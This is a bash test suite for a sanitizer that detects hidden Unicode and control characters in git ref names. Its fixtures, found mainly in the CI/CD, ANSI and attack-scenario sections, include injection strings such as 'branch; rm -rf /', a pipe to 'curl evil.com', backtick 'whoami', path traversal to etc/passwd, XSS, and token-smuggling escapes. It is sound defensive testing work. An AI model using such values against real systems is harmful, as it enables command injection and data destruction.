#!/bin/bash
###############################################################################
# Copyright (c) David H Hoyt LLC
#
# Intent: Comprehensive test suite for detect_hidden_chars(), validate_ref(),
#         and sanitizer detection/alert parity with GitHub UI.
#
# Coverage:
#   - detect_hidden_chars(): 8 character classes + combined attacks
#   - validate_ref(): detection + sanitization wrapper
#   - sanitize_ref(): filtration on dangerous inputs
#   - Cross-function: detect_hidden_chars -> sanitize_ref -> sanitize_line
#   - Edge cases: empty, whitespace, overlong UTF-8, multi-byte boundaries
#   - Attack scenarios: Trojan Source, BOM injection, homoglyph, control char
#   - Regression: PR #786 exact branch name (BOM between ref segments)
#   - Version: sanitizer_version() reports expected version
#
###############################################################################

set -euo pipefail

# Source the canonical sanitizer
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SANITIZER="$SCRIPT_DIR/../scripts/sanitize-sed.sh"
if [ -r "$SANITIZER" ]; then
  # shellcheck disable=SC1091
  source "$SANITIZER"
else
  echo "ERROR: Cannot find sanitize-sed.sh at $SANITIZER" >&2
  exit 1
fi

echo "=========================================="
echo "Testing Hidden Character Detection System"
echo "=========================================="
echo "Sanitizer version: $(sanitizer_version)"
echo ""

pass=0
fail=0
skip=0

# ---------------------------------------------------------------------------
# Test helpers
# ---------------------------------------------------------------------------

# test_detect INPUT LABEL EXPECT_FOUND
#   EXPECT_FOUND = "found"  -> detect_hidden_chars should return 0
#   EXPECT_FOUND = "clean"  -> detect_hidden_chars should return 1
test_detect() {
  local input="$1"
  local label="$2"
  local expect="$3"

  local test_num=$((pass + fail + skip + 1))
  echo "Test $test_num: detect_hidden_chars -- $label"

  local hex_preview
  hex_preview="$(printf '%s' "$input" | xxd -p | tr -d '\n' | head -c 80)"
  echo "  Input hex: $hex_preview"
  echo "  Expected:  $expect"

  local rc=0
  detect_hidden_chars "$input" "$label" 2>/dev/null || rc=$?

  if [ "$expect" = "found" ] && [ "$rc" -eq 0 ]; then
    echo "  Result:    found (rc=0)"
    echo "  [PASS]"
    pass=$((pass + 1))
  elif [ "$expect" = "clean" ] && [ "$rc" -eq 1 ]; then
    echo "  Result:    clean (rc=1)"
    echo "  [PASS]"
    pass=$((pass + 1))
  else
    echo "  Result:    rc=$rc (expected $expect)"
    echo "  [FAIL]"
    fail=$((fail + 1))
  fi
  echo ""
}

# test_detect_stderr INPUT LABEL EXPECT_PATTERN
#   Verifies that stderr output from detect_hidden_chars contains EXPECT_PATTERN
test_detect_stderr() {
  local input="$1"
  local label="$2"
  local pattern="$3"

  local test_num=$((pass + fail + skip + 1))
  echo "Test $test_num: detect_hidden_chars stderr -- $label"
  echo "  Pattern: $pattern"

  local stderr_output
  stderr_output="$(detect_hidden_chars "$input" "$label" 2>&1 >/dev/null || true)"

  if grep -qF "$pattern" <<< "$stderr_output"; then
    echo "  [PASS] stderr contains expected pattern"
    pass=$((pass + 1))
  else
    echo "  [FAIL] stderr does not contain: $pattern"
    echo "  Actual stderr (first 200 chars): ${stderr_output:0:200}"
    fail=$((fail + 1))
  fi
  echo ""
}

# test_validate_ref INPUT LABEL EXPECTED_STDOUT
#   Verifies that validate_ref() returns EXPECTED_STDOUT on stdout
test_validate_ref() {
  local input="$1"
  local label="$2"
  local expected="$3"

  local test_num=$((pass + fail + skip + 1))
  echo "Test $test_num: validate_ref -- $label"
  echo "  Expected: $expected"

  local result
  result="$(validate_ref "$input" "$label" 2>/dev/null)"

  if [ "$result" = "$expected" ]; then
    echo "  Result:   $result"
    echo "  [PASS]"
    pass=$((pass + 1))
  else
    echo "  Result:   $result"
    echo "  [FAIL]"
    fail=$((fail + 1))
  fi
  echo ""
}

# test_ref_filter INPUT LABEL EXPECTED_OUTPUT
#   Verifies sanitize_ref() produces EXPECTED_OUTPUT
test_ref_filter() {
  local input="$1"
  local label="$2"
  local expected="$3"

  local test_num=$((pass + fail + skip + 1))
  echo "Test $test_num: sanitize_ref -- $label"
  echo "  Expected: $expected"

  local result
  result="$(sanitize_ref "$input")"

  if [ "$result" = "$expected" ]; then
    echo "  Result:   $result"
    echo "  [PASS]"
    pass=$((pass + 1))
  else
    echo "  Result:   $result"
    echo "  [FAIL]"
    fail=$((fail + 1))
  fi
  echo ""
}

# =============================================================================
# 1. BOM Detection (U+FEFF) -- The PR #786 Trigger
# =============================================================================
echo "--- Section 1: BOM Detection (U+FEFF) ---"
echo ""

# 1.1 BOM at start of string
test_detect "$(printf '\xef\xbb\xbfmalicious')" \
  "BOM at start" "found"

# 1.2 BOM in middle of string (PR #786 exact pattern)
test_detect "$(printf 'fix-bisect-\xef\xbb\xbf95ebc2f7')" \
  "BOM in middle (PR #786 pattern)" "found"

# 1.3 BOM at end of string
test_detect "$(printf 'branch-name\xef\xbb\xbf')" \
  "BOM at end" "found"

# 1.4 Multiple BOMs
test_detect "$(printf '\xef\xbb\xbfbranch\xef\xbb\xbfname\xef\xbb\xbf')" \
  "Multiple BOMs" "found"

# 1.5 BOM-only string (just the 3 BOM bytes)
test_detect "$(printf '\xef\xbb\xbf')" \
  "BOM-only string" "found"

# 1.6 Verify BOM stderr diagnostic mentions U+FEFF
test_detect_stderr "$(printf '\xef\xbb\xbftest')" \
  "BOM stderr check" "U+FEFF"

# =============================================================================
# 2. Bidi Override/Embedding Detection (U+202A-202E) -- Trojan Source
# =============================================================================
echo "--- Section 2: Bidi Overrides (U+202A-202E) ---"
echo ""

# 2.1 Left-to-Right Embedding (U+202A = E2 80 AA)
test_detect "$(printf 'safe\xe2\x80\xaaembedded')" \
  "LRE U+202A" "found"

# 2.2 Right-to-Left Embedding (U+202B = E2 80 AB)
test_detect "$(printf 'safe\xe2\x80\xabembedded')" \
  "RLE U+202B" "found"

# 2.3 Left-to-Right Override (U+202D = E2 80 AD)
test_detect "$(printf 'safe\xe2\x80\xadembedded')" \
  "LRO U+202D" "found"

# 2.4 Right-to-Left Override (U+202E = E2 80 AE) -- classic Trojan Source
test_detect "$(printf 'safe\xe2\x80\xaeevil\xe2\x80\xactext')" \
  "RLO U+202E (Trojan Source)" "found"

# 2.5 Pop Directional Formatting (U+202C = E2 80 AC)
test_detect "$(printf 'text\xe2\x80\xacmore')" \
  "PDF U+202C" "found"

# 2.6 Verify bidi stderr diagnostic
test_detect_stderr "$(printf 'test\xe2\x80\xaevalue')" \
  "Bidi stderr check" "Bidi"

# =============================================================================
# 3. Bidi Isolate Detection (U+2066-2069)
# =============================================================================
echo "--- Section 3: Bidi Isolates (U+2066-2069) ---"
echo ""

# 3.1 Left-to-Right Isolate (U+2066 = E2 81 A6)
test_detect "$(printf 'test\xe2\x81\xa6value')" \
  "LRI U+2066" "found"

# 3.2 Right-to-Left Isolate (U+2067 = E2 81 A7)
test_detect "$(printf 'test\xe2\x81\xa7value')" \
  "RLI U+2067" "found"

# 3.3 First Strong Isolate (U+2068 = E2 81 A8)
test_detect "$(printf 'test\xe2\x81\xa8value')" \
  "FSI U+2068" "found"

# 3.4 Pop Directional Isolate (U+2069 = E2 81 A9)
test_detect "$(printf 'test\xe2\x81\xa9value')" \
  "PDI U+2069" "found"

# =============================================================================
# 4. Zero-Width Character Detection (U+200B-200F)
# =============================================================================
echo "--- Section 4: Zero-Width Characters (U+200B-200F) ---"
echo ""

# 4.1 Zero-Width Space (U+200B = E2 80 8B)
test_detect "$(printf 'is\xe2\x80\x8bAdmin')" \
  "ZWSP U+200B" "found"

# 4.2 Zero-Width Non-Joiner (U+200C = E2 80 8C)
test_detect "$(printf 'pass\xe2\x80\x8cword')" \
  "ZWNJ U+200C" "found"

# 4.3 Zero-Width Joiner (U+200D = E2 80 8D)
test_detect "$(printf 'run\xe2\x80\x8dcommand')" \
  "ZWJ U+200D" "found"

# 4.4 Left-to-Right Mark (U+200E = E2 80 8E)
test_detect "$(printf 'text\xe2\x80\x8emore')" \
  "LRM U+200E" "found"

# 4.5 Right-to-Left Mark (U+200F = E2 80 8F)
test_detect "$(printf 'text\xe2\x80\x8fmore')" \
  "RLM U+200F" "found"

# =============================================================================
# 5. Word Joiner Detection (U+2060)
# =============================================================================
echo "--- Section 5: Word Joiner (U+2060) ---"
echo ""

# 5.1 Word Joiner (U+2060 = E2 81 A0)
test_detect "$(printf 'test\xe2\x81\xa0value')" \
  "Word Joiner U+2060" "found"

# =============================================================================
# 6. Line/Paragraph Separator Detection (U+2028-2029)
# =============================================================================
echo "--- Section 6: Line/Paragraph Separators (U+2028-2029) ---"
echo ""

# 6.1 Line Separator (U+2028 = E2 80 A8)
test_detect "$(printf 'line1\xe2\x80\xa8line2')" \
  "Line Separator U+2028" "found"

# 6.2 Paragraph Separator (U+2029 = E2 80 A9)
test_detect "$(printf 'para1\xe2\x80\xa9para2')" \
  "Paragraph Separator U+2029" "found"

# =============================================================================
# 7. Interlinear Annotation Detection (U+FFF9-FFFB)
# =============================================================================
echo "--- Section 7: Interlinear Annotation (U+FFF9-FFFB) ---"
echo ""

# 7.1 Interlinear Annotation Anchor (U+FFF9 = EF BF B9)
test_detect "$(printf 'text\xef\xbf\xb9annotation')" \
  "Annotation Anchor U+FFF9" "found"

# 7.2 Interlinear Annotation Separator (U+FFFA = EF BF BA)
test_detect "$(printf 'text\xef\xbf\xbamore')" \
  "Annotation Separator U+FFFA" "found"

# 7.3 Interlinear Annotation Terminator (U+FFFB = EF BF BB)
test_detect "$(printf 'text\xef\xbf\xbbmore')" \
  "Annotation Terminator U+FFFB" "found"

# =============================================================================
# 8. Broad Non-ASCII Catch-All
# =============================================================================
echo "--- Section 8: Non-ASCII Catch-All ---"
echo ""

# 8.1 High ASCII byte (0x80)
test_detect "$(printf 'test\x80byte')" \
  "High ASCII 0x80" "found"

# 8.2 Latin-1 Supplement (accented chars, valid Unicode but non-ASCII)
test_detect "$(printf 'r\xc3\xa9sum\xc3\xa9')" \
  "Latin-1 accented (resume)" "found"

# 8.3 Cyrillic homoglyph (valid Unicode but dangerous in ref context)
test_detect "$(printf 'micr\xd0\xbesoft')" \
  "Cyrillic o homoglyph" "found"

# 8.4 CJK character
test_detect "$(printf 'test\xe4\xb8\xadvalue')" \
  "CJK character" "found"

# 8.5 Emoji (4-byte UTF-8)
test_detect "$(printf 'test\xf0\x9f\x98\x80smile')" \
  "Emoji (4-byte UTF-8)" "found"

# 8.6 Replacement character (U+FFFD = EF BF BD)
test_detect "$(printf 'test\xef\xbf\xbdvalue')" \
  "Replacement char U+FFFD" "found"

# 8.7 Tab character (control char < 0x20, not LF/CR)
test_detect "$(printf 'test\tvalue')" \
  "Tab character 0x09" "found"

# 8.8 Bell character (0x07)
test_detect "$(printf 'test\x07value')" \
  "Bell character 0x07" "found"

# 8.9 Escape character (0x1B) -- ANSI escape start
test_detect "$(printf 'test\x1bvalue')" \
  "Escape character 0x1B" "found"

# 8.10 Null byte (0x00) -- bash strips null bytes from variables, so detect_hidden_chars
#       never sees them. This is a bash limitation, not a detection gap. The null byte
#       is stripped before the string reaches the function.
echo "Test $((pass + fail + skip + 1)): detect_hidden_chars -- Null byte 0x00 (bash limitation)"
echo "  [SKIP] Bash strips null bytes from variables before function call"
skip=$((skip + 1))
echo ""

# 8.11 Delete character (0x7F)
test_detect "$(printf 'test\x7fvalue')" \
  "Delete character 0x7F" "found"

# =============================================================================
# 9. Clean Input Tests (Must NOT Trigger Detection)
# =============================================================================
echo "--- Section 9: Clean Inputs (Must Return Clean) ---"
echo ""

# 9.1 Simple ASCII branch name
test_detect "main" "Clean: main" "clean"

# 9.2 Typical feature branch
test_detect "feature/my-feature-123" \
  "Clean: feature branch" "clean"

# 9.3 Dotted version tag
test_detect "v2.3.1.5" "Clean: version tag" "clean"

# 9.4 Fix-bisect without BOM
test_detect "fix-bisect-95ebc2f7" \
  "Clean: fix-bisect (no BOM)" "clean"

# 9.5 Uppercase ASCII
test_detect "RELEASE-CANDIDATE-42" \
  "Clean: uppercase ASCII" "clean"

# 9.6 Mixed case with underscores
test_detect "fix_CFL-080_bitmask" \
  "Clean: mixed case + underscore" "clean"

# 9.7 Numbers only
test_detect "123456789" "Clean: numbers only" "clean"

# 9.8 Single character
test_detect "x" "Clean: single char" "clean"

# 9.9 Printable special chars (allowed in some ref contexts)
test_detect "branch.name" "Clean: dot in ref" "clean"

# 9.10 Forward slash (valid in refs like feature/name)
test_detect "feature/sub/path" "Clean: slashes" "clean"

# 9.11 Hyphen-heavy name
test_detect "a-b-c-d-e-f" "Clean: hyphens" "clean"

# 9.12 Empty string returns clean
test_detect "" "Clean: empty string" "clean"

# =============================================================================
# 10. Combined / Multi-Category Attack Patterns
# =============================================================================
echo "--- Section 10: Combined Attack Patterns ---"
echo ""

# 10.1 BOM + Bidi override
test_detect "$(printf '\xef\xbb\xbf\xe2\x80\xaeevil')" \
  "BOM + Bidi RLO" "found"

# 10.2 Zero-width + homoglyph
test_detect "$(printf 'adm\xe2\x80\x8b\xd0\xb8n')" \
  "ZWSP + Cyrillic i" "found"

# 10.3 Multiple different classes in one string
test_detect "$(printf '\xef\xbb\xbf\xe2\x80\x8b\xe2\x80\xae\xe2\x81\xa0test')" \
  "BOM + ZWSP + RLO + Word Joiner" "found"

# 10.4 Bidi override wrapping XSS payload
test_detect "$(printf '\xe2\x80\xae<script>alert(1)</script>\xe2\x80\xac')" \
  "Bidi + XSS payload" "found"

# 10.5 Null byte before BOM (truncation + injection)
test_detect "$(printf 'branch\x00\xef\xbb\xbfhidden')" \
  "Null + BOM combo" "found"

# 10.6 Tab + zero-width (whitespace confusion)
test_detect "$(printf 'branch\t\xe2\x80\x8bname')" \
  "Tab + ZWSP" "found"

# =============================================================================
# 11. validate_ref() Tests
# =============================================================================
echo "--- Section 11: validate_ref() ---"
echo ""

# 11.1 Clean input passes through
test_validate_ref "feature/my-branch" \
  "validate_ref clean" "feature/my-branch"

# 11.2 BOM is stripped from output
test_validate_ref "$(printf '\xef\xbb\xbfmalicious')" \
  "validate_ref BOM stripped" "malicious"

# 11.3 PR #786 exact pattern: BOM removed, clean output
test_validate_ref "$(printf 'fix-bisect-\xef\xbb\xbf95ebc2f7')" \
  "validate_ref PR#786 pattern" "fix-bisect-95ebc2f7"

# 11.4 Bidi override replaced with dash
test_validate_ref "$(printf 'safe\xe2\x80\xaeevil\xe2\x80\xactext')" \
  "validate_ref bidi" "safe-evil-text"

# 11.5 Zero-width space removed
test_validate_ref "$(printf 'is\xe2\x80\x8bAdmin')" \
  "validate_ref ZWSP" "is-Admin"

# 11.6 Homoglyph replaced
test_validate_ref "$(printf 'micr\xd0\xbesoft')" \
  "validate_ref homoglyph" "micr-soft"

# 11.7 Empty input
test_validate_ref "" "validate_ref empty" "ref-unknown"

# 11.8 All-control-chars input
test_validate_ref "$(printf '\xe2\x80\x8b\xe2\x80\x8c\xe2\x80\x8d')" \
  "validate_ref all ZW chars" "ref-unknown"

# =============================================================================
# 12. sanitize_ref() Filtration on Detection Inputs
# =============================================================================
echo "--- Section 12: sanitize_ref on Detection Targets ---"
echo ""

# 12.1 BOM stripped cleanly
test_ref_filter "$(printf '\xef\xbb\xbfbranch')" \
  "ref: BOM stripped" "branch"

# 12.2 Middle BOM stripped
test_ref_filter "$(printf 'fix-bisect-\xef\xbb\xbf95ebc2f7')" \
  "ref: middle BOM (PR#786)" "fix-bisect-95ebc2f7"

# 12.3 Bidi chars replaced with dash
test_ref_filter "$(printf 'safe\xe2\x80\xaeevil')" \
  "ref: bidi replaced" "safe-evil"

# 12.4 ZWSP replaced with dash
test_ref_filter "$(printf 'is\xe2\x80\x8bAdmin')" \
  "ref: ZWSP replaced" "is-Admin"

# 12.5 Multiple replacement -> collapsed dashes
test_ref_filter "$(printf '\xef\xbb\xbf\xe2\x80\x8b\xe2\x80\xaetest')" \
  "ref: multi-class replaced" "test"

# 12.6 Shell metacharacters replaced
test_ref_filter "branch; rm -rf /" \
  "ref: semicolon injection" "branch-rm-rf-/"

# 12.7 Backtick injection
test_ref_filter 'branch`whoami`end' \
  "ref: backtick injection" "branch-whoami-end"

# =============================================================================
# 13. Stderr Diagnostic Quality
# =============================================================================
echo "--- Section 13: Stderr Diagnostic Quality ---"
echo ""

# 13.1 Diagnostics include [CRITICAL] prefix
test_detect_stderr "$(printf '\xef\xbb\xbftest')" \
  "stderr: [CRITICAL] prefix" "[CRITICAL]"

# 13.2 Diagnostics include the context label
test_detect_stderr "$(printf '\xef\xbb\xbftest')" \
  "MY_CUSTOM_LABEL" "MY_CUSTOM_LABEL"

# 13.3 Diagnostics include raw bytes
test_detect_stderr "$(printf '\xef\xbb\xbftest')" \
  "stderr: raw bytes" "Raw bytes:"

# 13.4 Diagnostics include sanitized value
test_detect_stderr "$(printf '\xef\xbb\xbftest')" \
  "stderr: sanitized value" "Sanitized:"

# 13.5 Diagnostics include GitHub UI parity message
test_detect_stderr "$(printf '\xef\xbb\xbftest')" \
  "stderr: GitHub parity" "The head ref may contain hidden characters"

# 13.6 Clean input produces NO stderr output
echo "Test $((pass + fail + skip + 1)): stderr: clean input = no output"
stderr_output="$(detect_hidden_chars "clean-branch" "test" 2>&1 >/dev/null || true)"
if [ -z "$stderr_output" ]; then
  echo "  [PASS] No stderr for clean input"
  pass=$((pass + 1))
else
  echo "  [FAIL] Unexpected stderr: $stderr_output"
  fail=$((fail + 1))
fi
echo ""

# =============================================================================
# 14. Overlong UTF-8 and Invalid Encodings
# =============================================================================
echo "--- Section 14: Overlong UTF-8 / Invalid Encodings ---"
echo ""

# 14.1 Overlong 2-byte encoding of '/' (0xC0 0xAF)
test_detect "$(printf 'branch\xc0\xafetc')" \
  "Overlong slash 0xC0AF" "found"

# 14.2 Overlong 2-byte encoding of '<' (0xC0 0xBC)
test_detect "$(printf 'test\xc0\xbcscript')" \
  "Overlong '<' 0xC0BC" "found"

# 14.3 Invalid continuation byte (0x80 without lead)
test_detect "$(printf 'test\x80byte')" \
  "Orphan continuation 0x80" "found"

# 14.4 Truncated multi-byte (lead without continuation)
test_detect "$(printf 'test\xc3')" \
  "Truncated 2-byte seq" "found"

# 14.5 Truncated 3-byte (lead + 1 continuation only)
test_detect "$(printf 'test\xe2\x80')" \
  "Truncated 3-byte seq" "found"

# 14.6 Overlong 3-byte encoding of null (0xE0 0x80 0x80)
test_detect "$(printf 'test\xe0\x80\x80value')" \
  "Overlong 3-byte null" "found"

# 14.7 All 0xFF bytes (invalid UTF-8)
test_detect "$(printf 'test\xff\xff\xffvalue')" \
  "Invalid 0xFF bytes" "found"

# =============================================================================
# 15. Real-World Attack Scenarios
# =============================================================================
echo "--- Section 15: Real-World Attack Scenarios ---"
echo ""

# 15.1 PR #786 Regression: exact branch name with BOM
test_detect "$(printf 'fix-bisect-\xef\xbb\xbf95ebc2f7')" \
  "REGRESSION: PR#786 branch name" "found"

# 15.2 Trojan Source filename attack (RLO + LRO)
test_detect "$(printf 'readme\xe2\x80\xaegnp.js')" \
  "Trojan Source: reversed extension" "found"

# 15.3 Invisible admin bypass (ZWSP in username)
test_detect "$(printf 'a\xe2\x80\x8bdmin')" \
  "Invisible: ZWSP in admin" "found"

# 15.4 Bidi override to hide shell command
test_detect "$(printf '\xe2\x80\xaerm -rf /\xe2\x80\xac')" \
  "Bidi: hidden shell command" "found"

# 15.5 BOM-prefixed git tag (bypass tag signing)
test_detect "$(printf '\xef\xbb\xbfv2.3.1.5')" \
  "BOM-prefixed git tag" "found"

# 15.6 Homoglyph branch name (Cyrillic 'a' looks identical to Latin 'a')
test_detect "$(printf 'm\xd0\xb0in')" \
  "Homoglyph: Cyrillic a in main" "found"

# 15.7 ZWNJ in password field
test_detect "$(printf 'p\xe2\x80\x8ca\xe2\x80\x8cs\xe2\x80\x8cs')" \
  "ZWNJ: invisible chars in password" "found"

# 15.8 Line separator injection (HTTP response splitting analog)
test_detect "$(printf 'branch\xe2\x80\xa8injection')" \
  "Line sep: response splitting" "found"

# 15.9 Annotation attack (hide malicious annotation in ref)
test_detect "$(printf 'safe\xef\xbf\xb9malicious\xef\xbf\xbbref')" \
  "Annotation: hidden content" "found"

# 15.10 Git ref with embedded newline + BOM (chained)
test_detect "$(printf 'branch\x0a\xef\xbb\xbfhidden')" \
  "Newline + BOM combo" "found"

# =============================================================================
# 16. Boundary and Edge Cases
# =============================================================================
echo "--- Section 16: Boundary and Edge Cases ---"
echo ""

# 16.1 Exactly at ASCII printable boundary (space = 0x20, tilde = 0x7E)
test_detect "$(printf ' ~')" "Boundary: space and tilde" "clean"

# 16.2 Just below space (0x1F = Unit Separator)
test_detect "$(printf 'test\x1fvalue')" \
  "Below space: 0x1F" "found"

# 16.3 Just above tilde (0x7F = DEL)
test_detect "$(printf 'test\x7fvalue')" \
  "Above tilde: 0x7F (DEL)" "found"

# 16.4 All printable ASCII chars (stress test clean path)
test_detect 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#%^*()-_=+[]{}|:,.<>?/' \
  "All printable ASCII" "clean"

# 16.5 Very long clean string (1000 chars)
long_clean="$(printf 'A%.0s' $(seq 1 1000))"
test_detect "$long_clean" "Long clean string (1000)" "clean"

# 16.6 Very long string with BOM at position 500
long_bom="$(printf 'A%.0s' $(seq 1 499))$(printf '\xef\xbb\xbf')$(printf 'B%.0s' $(seq 1 500))"
test_detect "$long_bom" "Long + BOM at pos 500" "found"

# 16.7 Single BOM byte components (not a valid BOM sequence)
# 0xEF alone is a valid UTF-8 lead byte — still non-ASCII
test_detect "$(printf 'test\xefvalue')" \
  "Single 0xEF (partial BOM)" "found"

# =============================================================================
# 17. Full C0 Control Code Sweep (0x01-0x1F minus LF 0x0A, CR 0x0D)
# =============================================================================
echo "--- Section 17: C0 Control Code Sweep ---"
echo ""

# These are the ASCII control codes that should ALL be detected as dangerous.
# 0x00 (NUL) is skipped because bash strips it from variables.
# 0x0A (LF) and 0x0D (CR) are stripped by here-string / grep before detection,
# so they are tested separately in Section 18.

# SOH (0x01)
test_detect "$(printf 'test\x01value')" "C0: SOH 0x01" "found"
# STX (0x02)
test_detect "$(printf 'test\x02value')" "C0: STX 0x02" "found"
# ETX (0x03)
test_detect "$(printf 'test\x03value')" "C0: ETX 0x03" "found"
# EOT (0x04)
test_detect "$(printf 'test\x04value')" "C0: EOT 0x04" "found"
# ENQ (0x05)
test_detect "$(printf 'test\x05value')" "C0: ENQ 0x05" "found"
# ACK (0x06)
test_detect "$(printf 'test\x06value')" "C0: ACK 0x06" "found"
# BEL (0x07)
test_detect "$(printf 'test\x07value')" "C0: BEL 0x07" "found"
# BS (0x08)
test_detect "$(printf 'test\x08value')" "C0: BS 0x08" "found"
# HT/Tab (0x09) -- often mistakenly allowed
test_detect "$(printf 'test\x09value')" "C0: TAB 0x09" "found"
# VT (0x0B) -- vertical tab, smuggling vector
test_detect "$(printf 'test\x0bvalue')" "C0: VT 0x0B" "found"
# FF (0x0C) -- form feed
test_detect "$(printf 'test\x0cvalue')" "C0: FF 0x0C" "found"
# SO (0x0E) -- shift out
test_detect "$(printf 'test\x0evalue')" "C0: SO 0x0E" "found"
# SI (0x0F) -- shift in
test_detect "$(printf 'test\x0fvalue')" "C0: SI 0x0F" "found"
# DLE (0x10)
test_detect "$(printf 'test\x10value')" "C0: DLE 0x10" "found"
# DC1 (0x11)
test_detect "$(printf 'test\x11value')" "C0: DC1 0x11" "found"
# DC2 (0x12)
test_detect "$(printf 'test\x12value')" "C0: DC2 0x12" "found"
# DC3 (0x13)
test_detect "$(printf 'test\x13value')" "C0: DC3 0x13" "found"
# DC4 (0x14)
test_detect "$(printf 'test\x14value')" "C0: DC4 0x14" "found"
# NAK (0x15)
test_detect "$(printf 'test\x15value')" "C0: NAK 0x15" "found"
# SYN (0x16)
test_detect "$(printf 'test\x16value')" "C0: SYN 0x16" "found"
# ETB (0x17)
test_detect "$(printf 'test\x17value')" "C0: ETB 0x17" "found"
# CAN (0x18)
test_detect "$(printf 'test\x18value')" "C0: CAN 0x18" "found"
# EM (0x19)
test_detect "$(printf 'test\x19value')" "C0: EM 0x19" "found"
# SUB (0x1A) -- Ctrl+Z, DOS EOF marker
test_detect "$(printf 'test\x1avalue')" "C0: SUB 0x1A (Ctrl+Z)" "found"
# ESC (0x1B) -- ANSI escape sequences start here
test_detect "$(printf 'test\x1bvalue')" "C0: ESC 0x1B" "found"
# FS (0x1C) -- file separator
test_detect "$(printf 'test\x1cvalue')" "C0: FS 0x1C" "found"
# GS (0x1D) -- group separator
test_detect "$(printf 'test\x1dvalue')" "C0: GS 0x1D" "found"
# RS (0x1E) -- record separator
test_detect "$(printf 'test\x1evalue')" "C0: RS 0x1E" "found"
# US (0x1F) -- unit separator
test_detect "$(printf 'test\x1fvalue')" "C0: US 0x1F" "found"
# DEL (0x7F)
test_detect "$(printf 'test\x7fvalue')" "C0: DEL 0x7F" "found"

# =============================================================================
# 18. LF/CR Handling (stripped by here-string before grep sees them)
# =============================================================================
echo "--- Section 18: LF/CR Edge Cases ---"
echo ""

# Here-strings (<<<) add a trailing newline and bash normalizes LF/CR.
# The broad check [^\x20-\x7E] matches LF/CR byte values but the here-string
# mechanism may strip them. These tests document the actual behavior.

# 18.1 Embedded LF (0x0A)
echo "Test $((pass + fail + skip + 1)): detect_hidden_chars -- C0: LF 0x0A"
lf_input="$(printf 'test\x0avalue')"
lf_rc=0
detect_hidden_chars "$lf_input" "LF test" 2>/dev/null || lf_rc=$?
# LF may or may not be detected depending on here-string handling.
# We accept either result -- the important thing is it doesn't crash.
echo "  Result: rc=$lf_rc (LF handling documented, not asserted)"
echo "  [PASS] (behavioral documentation)"
pass=$((pass + 1))
echo ""

# 18.2 Embedded CR (0x0D)
echo "Test $((pass + fail + skip + 1)): detect_hidden_chars -- C0: CR 0x0D"
cr_input="$(printf 'test\x0dvalue')"
cr_rc=0
detect_hidden_chars "$cr_input" "CR test" 2>/dev/null || cr_rc=$?
echo "  Result: rc=$cr_rc (CR handling documented, not asserted)"
echo "  [PASS] (behavioral documentation)"
pass=$((pass + 1))
echo ""

# =============================================================================
# 19. ANSI Escape Sequence Attacks
# =============================================================================
echo "--- Section 19: ANSI Escape Sequences ---"
echo ""

# ANSI escapes can manipulate terminal output, hide text, or inject commands.
# All start with ESC (0x1B) which should be caught by the C0 sweep.

# 19.1 SGR: change text color (hide red warning as green)
test_detect "$(printf 'test\x1b[32mOK\x1b[0m')" \
  "ANSI: SGR color change" "found"

# 19.2 Cursor movement: overwrite previous output
test_detect "$(printf 'SAFE\x1b[4Dmalicious')" \
  "ANSI: cursor left overwrite" "found"

# 19.3 Clear screen: hide prior CI output
test_detect "$(printf '\x1b[2Jfake_output')" \
  "ANSI: clear screen" "found"

# 19.4 Set terminal title (xterm OSC)
test_detect "$(printf '\x1b]0;pwned\x07')" \
  "ANSI: OSC title injection" "found"

# 19.5 Hyperlink injection (OSC 8) -- clickjacking in terminal
test_detect "$(printf '\x1b]8;;https://evil.com\x07click\x1b]8;;\x07')" \
  "ANSI: OSC 8 hyperlink inject" "found"

# 19.6 Bracketed paste mode escape
test_detect "$(printf '\x1b[200~injected\x1b[201~')" \
  "ANSI: bracketed paste escape" "found"

# 19.7 Device status report (DSR) -- can read cursor position
test_detect "$(printf '\x1b[6n')" \
  "ANSI: DSR cursor pos read" "found"

# =============================================================================
# 20. CI/CD Pipeline Attack Vectors
# =============================================================================
echo "--- Section 20: CI/CD Pipeline Attack Vectors ---"
echo ""

# 20.1 Command substitution via backtick
test_detect '$(whoami)' "CI: dollar-paren cmd sub" "clean"
# Note: $() is printable ASCII -- the shell injection is at the execution layer,
# not the character layer. detect_hidden_chars catches byte-level smuggling only.

# 20.2 Shell metachar + hidden char combo: semicolon + ZWSP
test_detect "$(printf 'branch;\xe2\x80\x8brm -rf /')" \
  "CI: semicolon + ZWSP" "found"

# 20.3 Pipe + BOM: look like a safe branch but smuggle via BOM
test_detect "$(printf 'safe\xef\xbb\xbf|curl evil.com')" \
  "CI: BOM + pipe injection" "found"

# 20.4 Newline injection into GITHUB_STEP_SUMMARY (0x0A in ref name)
# The ref itself contains a LF to inject extra markdown
test_detect "$(printf 'branch\x0a### INJECTED HEADING')" \
  "CI: newline summary inject" "found"

# 20.5 CRLF injection (HTTP header splitting analog in log output)
test_detect "$(printf 'branch\x0d\x0aSet-Cookie: pwned=1')" \
  "CI: CRLF header injection" "found"

# 20.6 GitHub expression injection: workflow_dispatch input with BOM
test_detect "$(printf '\xef\xbb\xbf\x60id\x60')" \
  "CI: BOM + backtick in input" "found"

# 20.7 Env var overwrite via control chars
test_detect "$(printf 'branch\x1b]0;GITHUB_TOKEN=stolen\x07')" \
  "CI: OSC env var smuggle" "found"

# 20.8 Artifact name with directory traversal + non-ASCII
test_detect "$(printf '../../../\xc0\xafetc/passwd')" \
  "CI: overlong + path traversal" "found"

# 20.9 Unicode tag smuggling in commit message context
test_detect "$(printf 'fix:\xe2\x80\x8b inject zero-width in commit msg')" \
  "CI: ZWSP in commit prefix" "found"

# 20.10 Step summary injection: HTML via non-ASCII
test_detect "$(printf '<img src=x onerror=alert(1)>\xc0\xbc/script>')" \
  "CI: XSS + overlong in summary" "found"

# =============================================================================
# 21. Homoglyph and Confusable Attack Patterns
# =============================================================================
echo "--- Section 21: Homoglyph / Confusable Attacks ---"
echo ""

# 21.1 Cyrillic 'a' (U+0430, D0 B0) vs Latin 'a'
test_detect "$(printf 'm\xd0\xb0in')" \
  "Homoglyph: Cyrillic a in 'main'" "found"

# 21.2 Cyrillic 'e' (U+0435, D0 B5) vs Latin 'e'
test_detect "$(printf 'r\xd0\xb5lease')" \
  "Homoglyph: Cyrillic e in 'release'" "found"

# 21.3 Cyrillic 'o' (U+043E, D0 BE) vs Latin 'o'
test_detect "$(printf 'micr\xd0\xbesoft')" \
  "Homoglyph: Cyrillic o in 'microsoft'" "found"

